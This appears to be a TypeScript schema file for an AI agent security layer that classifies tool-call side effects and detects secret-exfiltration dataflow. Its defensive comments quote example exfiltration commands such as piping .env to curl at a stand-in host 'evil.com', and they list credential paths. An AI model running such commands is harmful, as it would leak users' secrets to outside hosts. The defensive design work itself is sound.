import { z } from "zod";
import { JsonObject } from "../common/json.js";

/**
 * Tool side-effect taxonomy — the frozen `@keel/shared` contract (MASTER_SPEC §4.8; ADR-0024,
 * re-opened per `docs/design/2026-06-21-side-effect-taxonomy-problem.md`). It is carried by the
 * **policy input** (Appendix D §D.1) and the **audit record** (Appendix B), and consumed by the
 * retry policy (§4.3 / ADR-0028), review prompts (§8.5), and the autonomy postures (§4.9).
 *
 * R1 FREEZE STATUS: ACCEPTED as the Phase-2A audit/policy format contract (ADR-0027), ratified
 * together with the ADR-0024 revision, the capability-manifest ADR (0056), and the OAP decision
 * (ADR-0013). `taxonomyVersion` reads `side-effect-taxonomy/v1` to pin the contract a record obeys.
 *
 * DESIGN SPINE (do not deviate): *Freeze structure conservatively. Freeze primitives minimally.
 * Derive composites in policy. Use classifier confidence for uncertainty. Use sandbox/egress as the
 * hard backstop.* The AXES and the OBJECT SHAPE are the conservative commitment; the primitive enum
 * VALUES are minimized (composites like exfiltration_risk / supply_chain are policy-derived from
 * these primitives, never frozen here). GROWTH (F4): MAJOR is the semantic-break axis (a v2 record is
 * rejected); a v1.x MINOR may add enum members / optional fields, and a newer-minor record is read via
 * `parseSideEffectCompat`, which coerces members this build does not recognize to the fail-closed
 * `unknown` of their axis (accepted but NEVER silently trusted). `extensions` carries additive vendor
 * data. Every enum therefore carries an `unknown` member — both a runtime fail-closed value AND the
 * forward-compat coercion target.
 *
 * AUTHORITY (ADR-0017): the kernel declares only the per-tool STATIC envelope; the WARDEN computes
 * the per-invocation DYNAMIC effect (shell-normalize + path/symlink resolve + obfuscation peel). The
 * model can only *request*; it never self-classifies to dodge policy. `targets[].withinWorkspace` /
 * `sensitivity` are classifier CLAIMS with confidence — the sandbox + egress allowlist are the
 * AUTHORITATIVE backstop, so a classifier mistake fails *safe* (a policy-allow the sandbox blocks
 * emits a `policy_sandbox_mismatch` finding — capability-manifest ADR).
 */

/** The taxonomy contract a `SideEffect` record obeys. `v1.x` is additive; `v2` is a semantic break. */
export const SIDE_EFFECT_TAXONOMY_VERSION = "side-effect-taxonomy/v1" as const;

/**
 * Array-size caps. A `SideEffect` rides the audit chain, which is verified out-of-process over
 * UNTRUSTED input (AGENTS.md *trust-before-parse; assume hostile inputs*): a record with millions of
 * segments/edges/targets would exhaust a verifier before any policy runs. These bounds are generous
 * versus any real command (the 73-trial command corpus max compound was a handful of segments) yet finite, so a
 * hostile import is rejected at the schema boundary rather than DoS-ing the parser. (QC re-review add.)
 */
export const SIDE_EFFECT_LIMITS = {
  maxSegments: 256,
  maxEdges: 4096,
  maxTargets: 256,
  maxReasons: 256,
  /** effect-kind / scope / modifier input arrays dedup to ≤ enum size; this caps the *input* length. */
  maxEffectArray: 64,
} as const;

/**
 * Version policy (ADR-0024 / F4 forward-compat). The contract is `side-effect-taxonomy/v<major>[.minor]`.
 * MAJOR is the semantic-break axis (a v2 record is NOT interpretable by a v1 build — reject); MINOR is the
 * ADDITIVE axis (a newer minor may add enum members / optional fields). This build implements major v1,
 * minor 0, whose canonical spelling is `v1` (not `v1.0`). A record from a NEWER minor is read via
 * `parseSideEffectCompat`, which coerces members this build doesn't recognize to the fail-closed `unknown`
 * of their axis (never silently trusted). The strict `SideEffect` schema pins MAJOR to 1 and accepts any
 * minor whose members it already knows.
 */
export const SIDE_EFFECT_TAXONOMY_MAJOR = 1;
export const SIDE_EFFECT_TAXONOMY_MINOR = 0;
// Each version has ONE canonical spelling because taxonomyVersion is hashed into the audit record:
// minor 0 is omitted (`v1`, not `v1.0`), and non-zero numeric components reject leading zeros.
const TAXONOMY_VERSION_RE = /^side-effect-taxonomy\/v(0|[1-9]\d*)(?:\.([1-9]\d*))?$/;

/** Parse a `taxonomyVersion` string into {major, minor} (minor defaults to 0); null if unparseable. */
function parseTaxonomyVersion(v: string): { major: number; minor: number } | null {
  const m = TAXONOMY_VERSION_RE.exec(v);
  if (m === null) return null;
  return { major: Number(m[1]), minor: m[2] === undefined ? 0 : Number(m[2]) };
}

/**
 * Axis 1 — *what* action occurs. The minimal orthogonal primitive set the real command distribution
 * + the §7 adversarial set demand (73-trial command corpus traffic: process_exec 45.6%, fs_read 23.5%,
 * fs_write 17.4%, network 15.7%). Deliberately EXCLUDED as policy-derived (anchor §3 YAGNI ledger):
 * `credential_access` (= fs/env op ∧ `secret` target), `external_state_write` (= network_write ∧
 * `external_service` scope), `system_config` (= fs_write|process_exec ∧ `system` scope),
 * `process_control` (= process_exec ∧ `process` target), `resource_use` (sandbox-enforced, below).
 * `unknown` is a KNOWN fail-closed value (a command the warden cannot decode), never the growth path.
 */
export const EffectKind = z.enum([
  "fs_read",
  "fs_write",
  "process_exec",
  "network_read",
  "network_write",
  "unknown",
]);
export type EffectKindT = z.infer<typeof EffectKind>;

/**
 * Axis 2 — *where* the effect lands. `external_service` is kept distinct from `network` because the
 * internal-vs-external boundary IS the exfiltration boundary (SEC-022); `external_state_write` is
 * then derivable as network_write ∧ external_service. `repo_metadata` is intentionally NOT a scope —
 * a `.git/…` access is a within-`workspace` target path the policy refines (anchor §8 decision).
 */
export const EffectScope = z.enum([
  "workspace",
  "home",
  "system",
  "temp",
  "network",
  "external_service",
  "process",
  "unknown",
]);
export type EffectScopeT = z.infer<typeof EffectScope>;

/**
 * Primitive risk qualifiers (orthogonal to kind). Minimal by design — each is a broad, retry-
 * excluding property that is hard to derive cleanly from kind×scope alone. EXCLUDED as policy-derived
 * (anchor §3): `exfiltration_risk`, `supply_chain` (explicit composites), `credential_adjacent`,
 * `permission_change`, `background`, and `expensive`/`resource_use`. Resource exhaustion is enforced
 * by the SANDBOX (ulimits, SEC-017), NOT predicted by this taxonomy. `ambiguous`/`obfuscated` are NOT
 * modifiers — they describe classifier *certainty* and live on `classifier.confidence`. `unknown` IS a
 * member: it is the fail-closed coercion target (F4) for a risk qualifier a NEWER taxonomy minor adds
 * that this build does not recognize — an `unknown` modifier is non-empty, so the call is non-retryable
 * and policy treats it as review/deny.
 */
export const RiskModifier = z.enum(["destructive", "irreversible", "persistent", "unknown"]);
export type RiskModifierT = z.infer<typeof RiskModifier>;

/** The kind of concrete resource a dynamic effect touches. `service` is omitted in v1 (additive later). */
export const TargetKind = z.enum([
  "path",
  "host",
  "url",
  "command",
  "process",
  "package",
  "env_var",
  "unknown",
]);
export type TargetKindT = z.infer<typeof TargetKind>;

/**
 * Resource sensitivity — a classifier claim that is NORMATIVE for filesystem/env targets: a `path`
 * or `env_var` target MUST carry a sensitivity (enforced by `SideEffectTarget`'s refine). The
 * classifier contract (proved by the §7 corpus): a known-secret namespace (`.env`, `~/.aws`,
 * `~/.ssh`, `/proc/self/environ`, `env`/`printenv`) resolves to `secret`; an UNDETERMINED sensitivity
 * on such a namespace lowers `classifier.confidence`, never an `exact` benign label.
 */
export const TargetSensitivity = z.enum(["public", "internal", "secret", "unknown"]);
export type TargetSensitivityT = z.infer<typeof TargetSensitivity>;

/**
 * A concrete resource a dynamic effect touches. `kind`/`value` are facts; `normalized` (realpath /
 * canonical host / decoded payload) is what policy + egress match on; `withinWorkspace`/`sensitivity`
 * are classifier CLAIMS (§5). REFINE: `path`/`env_var` targets MUST state a `sensitivity` so the
 * derived `credential_access` finding is never silently lost (user freeze sanity-check #1).
 */
export const SideEffectTarget = z
  .object({
    kind: TargetKind,
    value: z.string(),
    normalized: z.string().optional(),
    withinWorkspace: z.boolean().optional(),
    sensitivity: TargetSensitivity.optional(),
  })
  .strict()
  .superRefine((t, ctx) => {
    if ((t.kind === "path" || t.kind === "env_var") && t.sensitivity === undefined) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["sensitivity"],
        message: `sensitivity is required for ${t.kind} targets (normative; ADR-0024 freeze sanity-check #1)`,
      });
    }
  });
export type SideEffectTargetT = z.infer<typeof SideEffectTarget>;

/**
 * How the warden's classifier resolved this effect. Drives the POLICY-CONFIGURABLE disposition
 * (§4) — the schema freezes the certainty, NOT the allow/review/deny mapping (that is the swappable
 * policy pack / autonomy posture). `exact` = fully resolved; `conservative` = over-approximated to a
 * trustworthy upper bound; `ambiguous` = multiple readings / partial parse; `obfuscated` = required
 * de-obfuscation or deliberate obscuring (eval-of-dynamic, base64-decode-then-exec, `curl|bash`) —
 * NOT ordinary `&&`/pipe composition; `unknown` = could not classify (parse failure / unknown tool).
 */
export const ClassifierConfidence = z.enum([
  "exact",
  "conservative",
  "ambiguous",
  "obfuscated",
  "unknown",
]);
export type ClassifierConfidenceT = z.infer<typeof ClassifierConfidence>;

/**
 * The classifier's signed-off output for this invocation. `reasons` is a free-form list of stable
 * codes (e.g. `base64_decoded`, `secret_namespace`, `host_unresolved`) for audit + `keel policy why`
 * — NOT a frozen enum (an advisory, additive vocabulary, like `extensions`).
 */
export const ClassifierVerdict = z
  .object({
    name: z.string().min(1),
    version: z.string().min(1),
    confidence: ClassifierConfidence,
    reasons: z.array(z.string()).max(SIDE_EFFECT_LIMITS.maxReasons),
  })
  .strict();
export type ClassifierVerdictT = z.infer<typeof ClassifierVerdict>;

/**
 * The per-tool STATIC capability envelope — the worst-case effect a tool *could* produce, declared by
 * the kernel on its tool spec (ADR-0024). `bash`'s "broad/unbounded" is represented HERE as
 * `broad: true` + an `effectEnvelope`, NOT as a `broad` value polluting the effect-kind ontology
 * (anchor §2). Converges with `packages/kernel/src/tools/registry.ts`'s precursor `StaticCapability`
 * string union at warden integration (Phase 2A) — the kernel will import this shape.
 */
export const StaticCapability = z
  .object({
    toolName: z.string().min(1),
    effectEnvelope: z.array(EffectKind).min(1).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    broad: z.boolean(),
  })
  .strict();
export type StaticCapabilityT = z.infer<typeof StaticCapability>;

/**
 * One decomposed segment of a (possibly compound) invocation — e.g. each stage of a pipeline or each
 * command in an `&&`-chain. The classifier MUST decompose compound commands into segments and
 * disposition each segment's resolved effects; it must NEVER treat the mere presence of `&&`/`|`/
 * heredoc as risk (the 73-trial command corpus measurement: 76% of real commands are compound, almost all
 * benign — a composition-presence deny would reject ~75% of legitimate coding work).
 */
export const SideEffectSegment = z
  .object({
    effectKinds: z.array(EffectKind).min(1).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    scopes: z.array(EffectScope).min(1).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    targets: z.array(SideEffectTarget).max(SIDE_EFFECT_LIMITS.maxTargets),
    modifiers: z.array(RiskModifier).max(SIDE_EFFECT_LIMITS.maxEffectArray),
  })
  .strict();
export type SideEffectSegmentT = z.infer<typeof SideEffectSegment>;

/** Sort + dedup a set-like string array into a canonical order (for hash-stable records — see the
 *  `SideEffect` canonicalizing transform; QC reliability F1). */
function sortUnique<T extends string>(xs: readonly T[]): T[] {
  return [...new Set(xs)].sort();
}

/** Collision-free identity key for a target (set-membership + dedup): JSON-encode the tuple so a value
 *  containing the old delimiter cannot make two different targets collide and slip past the F1 refine. */
function targetKey(t: SideEffectTargetT): string {
  return JSON.stringify([
    t.kind,
    t.value,
    t.normalized ?? null,
    t.withinWorkspace ?? null,
    t.sensitivity ?? null,
  ]);
}

/** Dedup targets by identity, preserving first-occurrence (deterministic parse) order. Targets are
 *  ordered like `segments`/`reasons` (NOT sorted) — segment order is the classifier's deterministic
 *  parse order, so the deduped flat union is already hash-stable. */
function canonicalTargets(targets: readonly SideEffectTargetT[]): SideEffectTargetT[] {
  const seen = new Set<string>();
  const out: SideEffectTargetT[] = [];
  for (const t of targets) {
    const k = targetKey(t);
    if (!seen.has(k)) {
      seen.add(k);
      out.push(t);
    }
  }
  return out;
}

/**
 * The canonical aggregate over a segment list — the set-union of each segment's effect kinds / scopes /
 * modifiers (sorted+deduped) and targets (deduped, order-preserving). ONE source of truth, used by both
 * the `DynamicEffect` consistency refine and the canonicalizing transform (so the aggregation rule
 * cannot drift — QC maintainability F3). Top-level `dynamic.targets` is the *advisory* bag policy reads
 * for set-membership queries (e.g. "any secret target?"); F1 (QC re-review) makes it a REFINED + deduped
 * union of the segments, so it can never under-state them — dataflow-aware policy still reads
 * `composition.segments[].targets` + `edges`.
 */
export function aggregateSegments(segments: readonly SideEffectSegmentT[]): {
  effectKinds: EffectKindT[];
  scopes: EffectScopeT[];
  modifiers: RiskModifierT[];
  targets: SideEffectTargetT[];
} {
  return {
    effectKinds: sortUnique(segments.flatMap((s) => s.effectKinds)),
    scopes: sortUnique(segments.flatMap((s) => s.scopes)),
    modifiers: sortUnique(segments.flatMap((s) => s.modifiers)),
    targets: canonicalTargets(segments.flatMap((s) => s.targets)),
  };
}

/** Sort + dedup edges into a canonical order. Edge order carries no meaning (edges index into
 *  segments by position), so canonicalizing them keeps the hashed record stable (QC reliability F1/F6). */
function canonicalEdges(edges: readonly CompositionEdgeT[]): CompositionEdgeT[] {
  const seen = new Set<string>();
  return [...edges]
    .sort((a, b) => a.from - b.from || a.to - b.to || a.relation.localeCompare(b.relation))
    .filter((e) => {
      const key = `${e.from}:${e.to}:${e.relation}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
}

/**
 * How two segments connect, by array position in `Composition.segments`. `pipe`/`substitution`/
 * `redirect` carry DATA (the upstream segment's output reaches the downstream segment); `sequence`
 * (`;`) and `conditional` (`&&`/`||`) are ORDERING ONLY (no data movement). This is the load-bearing
 * exfiltration distinction (user freeze sanity-check #2): `cat .env | curl evil.com` emits a `pipe`
 * edge from the secret-source segment to the external-write segment; `cat .env && curl npmjs.org`
 * emits a `conditional` edge with NO dataflow — same flat effect bag, structurally distinguishable.
 * `unknown` is the fail-closed coercion target (F4) for a connector a NEWER taxonomy minor adds: an
 * unrecognized relation is treated as DATA-carrying by the exfil derivation, so a secret cannot slip
 * past the check merely by riding an edge kind this build does not recognize.
 */
export const EdgeRelation = z.enum([
  "pipe",
  "substitution",
  "redirect",
  "sequence",
  "conditional",
  "unknown",
]);
export type EdgeRelationT = z.infer<typeof EdgeRelation>;

/** A directed edge between two segments (`from`/`to` are indices into `Composition.segments`). */
export const CompositionEdge = z
  .object({
    from: z.number().int().nonnegative(),
    to: z.number().int().nonnegative(),
    relation: EdgeRelation,
  })
  .strict();
export type CompositionEdgeT = z.infer<typeof CompositionEdge>;

/** Coarse, ADVISORY human-display summary of a command's structure (e.g. for `keel policy why`). It is
 *  NOT authoritative and carries no enforced consistency with `segments`/`edges` — policy and the
 *  exfil derivation MUST reason over `edges`, never `kind` (QC simplicity F2). */
export const CompositionKind = z.enum([
  "atomic",
  "pipeline",
  "sequence",
  "conditional",
  "substitution",
  "mixed",
  "unknown",
]);
export type CompositionKindT = z.infer<typeof CompositionKind>;

/**
 * The decomposed structure of the invocation. `segments` is always ≥1 (an atomic command is one
 * segment); `edges` reference segment positions and preserve dataflow vs ordering so exfiltration
 * policy can ask "is there a DATA path from a secret source to an external sink?".
 */
export const Composition = z
  .object({
    kind: CompositionKind,
    segments: z.array(SideEffectSegment).min(1).max(SIDE_EFFECT_LIMITS.maxSegments),
    edges: z.array(CompositionEdge).max(SIDE_EFFECT_LIMITS.maxEdges),
  })
  .strict()
  .superRefine((c, ctx) => {
    for (let i = 0; i < c.edges.length; i++) {
      const e = c.edges[i]!;
      if (e.from >= c.segments.length || e.to >= c.segments.length) {
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          path: ["edges", i],
          message: `edge references a non-existent segment index (have ${c.segments.length} segments)`,
        });
      }
    }
  });
export type CompositionT = z.infer<typeof Composition>;

/**
 * The per-invocation resolved effect (the warden computes this). The top-level `effectKinds` /
 * `scopes` / `modifiers` are the AGGREGATE union over `composition.segments` (kept for cheap policy +
 * the retry predicate); `composition` preserves the structure for dataflow-aware policy. A refine
 * enforces aggregate↔segments consistency so the union can never under- or over-state the segments.
 */
export const DynamicEffect = z
  .object({
    effectKinds: z.array(EffectKind).min(1).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    scopes: z.array(EffectScope).min(1).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    targets: z.array(SideEffectTarget).max(SIDE_EFFECT_LIMITS.maxTargets),
    modifiers: z.array(RiskModifier).max(SIDE_EFFECT_LIMITS.maxEffectArray),
    composition: Composition,
    classifier: ClassifierVerdict,
  })
  .strict()
  .superRefine((d, ctx) => {
    // The aggregate must equal (as a SET) the union over segments — it can neither over- nor
    // UNDER-state the segments' effects (QC test F2: under-statement must reject). One source of
    // truth via aggregateSegments (QC maintainability F3).
    const eq = (a: readonly string[], b: readonly string[]): boolean => {
      const bs = new Set(b);
      return new Set(a).size === bs.size && a.every((v) => bs.has(v));
    };
    const agg = aggregateSegments(d.composition.segments);
    if (!eq(d.effectKinds, agg.effectKinds)) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["effectKinds"],
        message:
          "aggregate effectKinds must equal the set-union of composition.segments[].effectKinds",
      });
    }
    if (!eq(d.scopes, agg.scopes)) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["scopes"],
        message: "aggregate scopes must equal the set-union of composition.segments[].scopes",
      });
    }
    if (!eq(d.modifiers, agg.modifiers)) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["modifiers"],
        message: "aggregate modifiers must equal the set-union of composition.segments[].modifiers",
      });
    }
    // F1 (QC re-review): the advisory top-level `targets` bag MUST equal (as a SET) the union of the
    // segment targets. Otherwise a secret present in a segment but omitted from the bag a Rego rule
    // reads (e.g. POL-001 `some t in input.sideEffect.dynamic.targets`) would silently dodge the deny —
    // a fail-OPEN seam. (The transform then dedups it to the canonical union; this rejects drift.)
    if (!eq(d.targets.map(targetKey), agg.targets.map(targetKey))) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["targets"],
        message: "top-level targets must equal the set-union of composition.segments[].targets",
      });
    }
    // F6 (QC re-review): containment/egress policy matches path/host/url targets on `normalized`; an
    // ABSENT `normalized` makes a Rego containment rule's body undefined → the rule does not fire →
    // fail-OPEN. Require it for EVERY path/host/url target REGARDLESS of confidence — the earlier
    // exemption for low confidence depended on the policy reviewing `ambiguous`, a behavioral assumption
    // we will not bake into the frozen format. If a resource cannot be normalized it is not a
    // path/host/url target — it is an `unknown`-kind target. (Structural, not behavioral.)
    const needsNormalized = new Set<SideEffectTargetT["kind"]>(["path", "host", "url"]);
    for (const seg of d.composition.segments) {
      for (const t of seg.targets) {
        if (needsNormalized.has(t.kind) && t.normalized === undefined) {
          ctx.addIssue({
            code: z.ZodIssueCode.custom,
            path: ["composition", "segments"],
            message: `${t.kind} target "${t.value}" must carry normalized (enforcement-relevant; fail-closed)`,
          });
        }
      }
    }
  });
export type DynamicEffectT = z.infer<typeof DynamicEffect>;

/**
 * The complete side-effect classification for one tool invocation — the value carried by Appendix B
 * (audit) and Appendix D §D.1 (policy input). `extensions` is additive, audit-only unless a policy
 * pack explicitly opts into a namespace (anchor §3 growth strategy).
 */
export const SideEffect = z
  .object({
    // Major is pinned (a v2 record is a semantic break this build must not interpret); any v1 minor is
    // accepted structurally — a newer minor whose members this build doesn't know is handled by
    // `parseSideEffectCompat`, not by widening this schema (F4).
    taxonomyVersion: z.string().refine(
      (v) => {
        const p = parseTaxonomyVersion(v);
        return p !== null && p.major === SIDE_EFFECT_TAXONOMY_MAJOR;
      },
      { message: "taxonomyVersion must be side-effect-taxonomy/v1[.minor] (major v1)" },
    ),
    staticCapability: StaticCapability,
    dynamic: DynamicEffect,
    // JsonObject (not z.record(z.unknown())) so NaN/±Infinity/undefined cannot cross the audit JSON
    // wire or corrupt a hash-over-canonical-JSON — same discipline as AuditRecord.payload (QC F2).
    extensions: JsonObject.optional(),
  })
  .strict()
  // Canonicalize set-like arrays (sort+dedup) so two semantically-equal classifications hash
  // IDENTICALLY over the chained audit record — JCS canonicalizes object keys but NOT array order
  // (QC reliability F1). The schema OWNS ordering rather than delegating it to a future warden.
  // `segments` order is the classifier's deterministic parse order (positional; edges index into it);
  // `targets`/`reasons` are likewise emitted in deterministic order; `edges` are sorted+deduped.
  .transform((se) => ({
    ...se,
    staticCapability: {
      ...se.staticCapability,
      effectEnvelope: sortUnique(se.staticCapability.effectEnvelope),
    },
    dynamic: {
      ...se.dynamic,
      effectKinds: sortUnique(se.dynamic.effectKinds),
      scopes: sortUnique(se.dynamic.scopes),
      modifiers: sortUnique(se.dynamic.modifiers),
      // F1: DERIVE the advisory top-level bag from the segments (the single source of truth), not from
      // the provided value — so `dynamic.targets` is authoritative-by-construction and a crafted/drifted
      // provided bag cannot survive even if it slipped past the refine (QC re-review: belt + suspenders).
      targets: canonicalTargets(se.dynamic.composition.segments.flatMap((s) => s.targets)),
      composition: {
        ...se.dynamic.composition,
        segments: se.dynamic.composition.segments.map((s) => ({
          ...s,
          effectKinds: sortUnique(s.effectKinds),
          scopes: sortUnique(s.scopes),
          modifiers: sortUnique(s.modifiers),
        })),
        edges: canonicalEdges(se.dynamic.composition.edges),
      },
    },
  }));
export type SideEffectT = z.infer<typeof SideEffect>;

/**
 * Retry-eligibility predicate (amends ADR-0028 item 5 under the multi-axis model). A tool call may be
 * auto-retried after a classified InfraError ONLY when its resolved effect is provably read-only and
 * fully understood: every effect kind is `fs_read`, every scope is workspace/temp, there are no risk
 * modifiers, no secret target is touched, and the classifier was certain. Everything else (write /
 * network / process / external / system / credential / `unknown` / obfuscated) is non-retryable. The
 * dynamic effect is the warden's to resolve (Phase 2A); this stays default-OFF in Phase 1 (no warden
 * exists).
 */
export function isRetryEligible(effect: SideEffectT): boolean {
  const d = effect.dynamic;
  // Fail CLOSED on a degenerate/unparsed record: empty arrays would make `.every()` vacuously true,
  // so a caller that hand-builds a SideEffect (kernel precursor convergence) cannot fail open (QC F4/F5).
  if (d.effectKinds.length === 0 || d.scopes.length === 0 || d.composition.segments.length === 0) {
    return false;
  }
  const kindsOk = d.effectKinds.every((k) => k === "fs_read");
  const scopesOk = d.scopes.every((s) => s === "workspace" || s === "temp");
  const noModifiers = d.modifiers.length === 0;
  const targetRetrySafe = (t: SideEffectTargetT): boolean =>
    t.kind === "path" &&
    t.normalized !== undefined &&
    (t.sensitivity === "public" || t.sensitivity === "internal");
  // Fail CLOSED unless every segment is affirmatively a resolved, low-risk filesystem read. Empty target
  // bags and non-resource targets (e.g. only `command`/`host`) must not pass by omission; `unknown`
  // kind/sensitivity remains non-retryable after newer-minor coercion.
  const segmentsRetrySafe = d.composition.segments.every(
    (s) =>
      s.effectKinds.length > 0 &&
      s.effectKinds.every((k) => k === "fs_read") &&
      s.scopes.length > 0 &&
      s.scopes.every((scope) => scope === "workspace" || scope === "temp") &&
      s.modifiers.length === 0 &&
      s.targets.length > 0 &&
      s.targets.every(targetRetrySafe),
  );
  const confident =
    d.classifier.confidence === "exact" || d.classifier.confidence === "conservative";
  return kindsOk && scopesOk && noModifiers && segmentsRetrySafe && confident;
}

/**
 * Reference derivation of the `exfiltration_risk` composite (the policy pack mirrors this; it is NOT a
 * frozen primitive — anchor §3). Returns true iff a segment both touches a secret and writes externally,
 * OR there is a DATA path — `pipe`/`substitution`/`redirect`, NOT `sequence`/`conditional` — from a
 * secret-SOURCE segment (any segment touching a `secret`- OR `unknown`-sensitivity target, or an
 * unknown-kind target, whether via `fs_read` of `.env` OR an env dump like `printenv` whose secret rides an
 * `env_var` target — QC security F2) to an external network-write sink (`network_write` ∧
 * `external_service`).
 *
 * SCOPE / HONESTY (QC security F1): this models only IN-PROCESS, SHELL-CONNECTOR dataflow. It does NOT
 * model FILE-MEDIATED or out-of-process dataflow (`cat .env > /tmp/x; curl -d @/tmp/x evil` — two
 * commands joined through the filesystem, not a shell connector), nor data laundered through a variable
 * across a `;`. Those are caught by the egress allowlist + POL-006/011 at the SINK (the authoritative
 * backstop), never by this derivation. Callers MUST pass a `SideEffect.parse`'d value; the bounds
 * checks below only harden against an accidentally-unvalidated record.
 */
export function hasExfilDataflowPath(effect: SideEffectT): boolean {
  const { segments, edges } = effect.dynamic.composition;
  // `unknown` is included (fail-closed): a connector a newer taxonomy minor adds, coerced to `unknown`
  // by parseSideEffectCompat, is assumed to carry data so a secret cannot slip past on an edge kind this
  // build does not recognize (F4).
  const DATA: ReadonlySet<EdgeRelationT> = new Set(["pipe", "substitution", "redirect", "unknown"]);
  const inRange = (i: number): boolean => i >= 0 && i < segments.length;
  const isPotentialSecretTarget = (t: SideEffectTargetT): boolean =>
    t.sensitivity === "secret" || t.sensitivity === "unknown" || t.kind === "unknown";
  const isSecretSource = (i: number): boolean =>
    inRange(i) && segments[i]!.targets.some(isPotentialSecretTarget);
  const isExternalSink = (i: number): boolean =>
    inRange(i) &&
    segments[i]!.effectKinds.includes("network_write") &&
    segments[i]!.scopes.includes("external_service");
  const dataEdges = edges.filter((e) => DATA.has(e.relation) && inRange(e.from) && inRange(e.to));
  for (let src = 0; src < segments.length; src++) {
    if (!isSecretSource(src)) continue;
    const seen = new Set<number>([src]);
    const stack: number[] = [src];
    while (stack.length) {
      const cur = stack.pop()!;
      if (isExternalSink(cur)) return true;
      for (const e of dataEdges) {
        if (e.from === cur && !seen.has(e.to)) {
          seen.add(e.to);
          stack.push(e.to);
        }
      }
    }
  }
  return false;
}

/**
 * Honest v1 SCOPE BOUNDARY (ADR-0024 §2; `hasExfilDataflowPath` models only in-process shell-connector
 * dataflow). These dataflow/effect classes are deliberately NOT modeled by the taxonomy/derivation and
 * are caught instead by the sandbox + egress allowlist (the authoritative backstop) — never by the
 * in-process check. Named here (not buried in a comment) so the disclosure is explicit and TESTABLE; do
 * not silently widen the derivation to "cover" these — fix or rely on the backstop, or add it in a v1.x.
 */
export const SIDE_EFFECT_V1_NOT_MODELED = [
  "file_mediated_dataflow", // `cat .env > /tmp/x; curl @/tmp/x evil` — joined through the filesystem
  "variable_laundering", // a secret read into a shell var, then exfiltrated across a `;`
  "out_of_process_ipc", // unix sockets / named pipes / shared memory between processes
  "clipboard_and_keychain", // pbcopy / secret-service / OS keychain side channels
  "container_and_orchestrator", // docker / k8s API targets (a v1.x additive `target.kind` candidate)
  "script_language_internals", // effects inside `python -c` / `node -e` bodies (classified opaque/unknown)
] as const;

/** Replace an enum value not in `opts` with the fail-closed `unknown` member (every axis has one). */
function coerceMember(opts: readonly string[], v: unknown): string {
  return typeof v === "string" && opts.includes(v) ? v : "unknown";
}

/** Coerce each member of a (possibly newer-minor) enum array to a known member or `unknown`. */
function coerceEnumArray(opts: readonly string[], xs: unknown): unknown {
  return Array.isArray(xs) ? (xs as unknown[]).map((x) => coerceMember(opts, x)) : xs;
}

function coerceTarget(t: unknown): unknown {
  if (typeof t !== "object" || t === null) return t;
  const tt = t as Record<string, unknown>;
  const out: Record<string, unknown> = {
    ...tt,
    kind: coerceMember(TargetKind.options, tt["kind"]),
  };
  if (tt["sensitivity"] !== undefined) {
    out["sensitivity"] = coerceMember(TargetSensitivity.options, tt["sensitivity"]);
  }
  return out;
}

function coerceSegment(s: unknown): unknown {
  if (typeof s !== "object" || s === null) return s;
  const ss = s as Record<string, unknown>;
  return {
    ...ss,
    effectKinds: coerceEnumArray(EffectKind.options, ss["effectKinds"]),
    scopes: coerceEnumArray(EffectScope.options, ss["scopes"]),
    modifiers: coerceEnumArray(RiskModifier.options, ss["modifiers"]),
    targets: Array.isArray(ss["targets"])
      ? (ss["targets"] as unknown[]).map(coerceTarget)
      : ss["targets"],
  };
}

/**
 * Deep, FIELD-TARGETED coercion of every enum axis to a known member or its fail-closed `unknown` —
 * used only by `parseSideEffectCompat` for a newer-minor record. It touches enum fields ONLY (never the
 * free-form `reasons`/`value`/`normalized`/`extensions`), so a future minor's additive *data* survives
 * while its unknown *enum members* are made safe. Structurally-broken input is left for `SideEffect.parse`
 * to reject.
 */
function coerceUnknownEnums(raw: Record<string, unknown>): unknown {
  const r = raw;
  const out: Record<string, unknown> = { ...r };

  const sc = r["staticCapability"];
  if (typeof sc === "object" && sc !== null) {
    const scc = sc as Record<string, unknown>;
    out["staticCapability"] = {
      ...scc,
      effectEnvelope: coerceEnumArray(EffectKind.options, scc["effectEnvelope"]),
    };
  }

  const dyn = r["dynamic"];
  if (typeof dyn === "object" && dyn !== null) {
    const d = dyn as Record<string, unknown>;
    const dout: Record<string, unknown> = {
      ...d,
      effectKinds: coerceEnumArray(EffectKind.options, d["effectKinds"]),
      scopes: coerceEnumArray(EffectScope.options, d["scopes"]),
      modifiers: coerceEnumArray(RiskModifier.options, d["modifiers"]),
      targets: Array.isArray(d["targets"])
        ? (d["targets"] as unknown[]).map(coerceTarget)
        : d["targets"],
    };
    const cls = d["classifier"];
    if (typeof cls === "object" && cls !== null) {
      const c = cls as Record<string, unknown>;
      dout["classifier"] = {
        ...c,
        confidence: coerceMember(ClassifierConfidence.options, c["confidence"]),
      };
    }
    const comp = d["composition"];
    if (typeof comp === "object" && comp !== null) {
      const cp = comp as Record<string, unknown>;
      dout["composition"] = {
        ...cp,
        kind: coerceMember(CompositionKind.options, cp["kind"]),
        segments: Array.isArray(cp["segments"])
          ? (cp["segments"] as unknown[]).map(coerceSegment)
          : cp["segments"],
        edges: Array.isArray(cp["edges"])
          ? (cp["edges"] as unknown[]).map((e) => {
              if (typeof e !== "object" || e === null) return e;
              const ee = e as Record<string, unknown>;
              return { ...ee, relation: coerceMember(EdgeRelation.options, ee["relation"]) };
            })
          : cp["edges"],
      };
    }
    out["dynamic"] = dout;
  }
  return out;
}

/**
 * Forward-compatible reader for a `SideEffect` that MAY come from a newer MINOR taxonomy version (F4):
 *  - same major (v1), minor ≤ this build → parse strictly (`SideEffect.parse`); an unknown member here is
 *    malformed (not forward-compat) and is rejected.
 *  - same major (v1), minor > this build → a newer producer may carry members this build doesn't know;
 *    coerce each to its axis's fail-closed `unknown`, THEN parse. ACCEPTED, but the unknown values are
